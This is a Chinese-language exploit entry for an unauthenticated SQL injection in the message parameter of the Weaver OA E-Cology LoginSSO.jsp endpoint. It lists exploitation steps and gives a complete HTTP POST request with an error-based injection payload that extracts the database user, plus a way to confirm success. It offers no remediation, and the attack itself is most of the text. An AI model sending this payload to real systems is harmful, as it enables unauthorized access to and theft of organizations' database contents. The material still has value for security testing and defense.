## 漏洞描述

泛微OA LoginSSO.jsp 接口 message 参数存在 SQL 注入漏洞，攻击者可未授权获取数据库信息。

## 影响版本

- E-Cology

## 前置条件

- 无需认证
- 目标为泛微OA E-Cology，LoginSSO.jsp 接口可访问

## 利用步骤

1. 访问 `/mobile/plugin/LoginSSO.jsp` 确认接口存在
2. 构造 message 参数的报错注入 Payload 发送 POST 请求
3. 从响应中提取数据库报错回显信息（用户名、版本等）

## Payload

```http
POST /mobile/plugin/LoginSSO.jsp HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

message=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

## 验证方法

响应中出现报错注入回显（用户名等数据库信息）即确认漏洞存在。
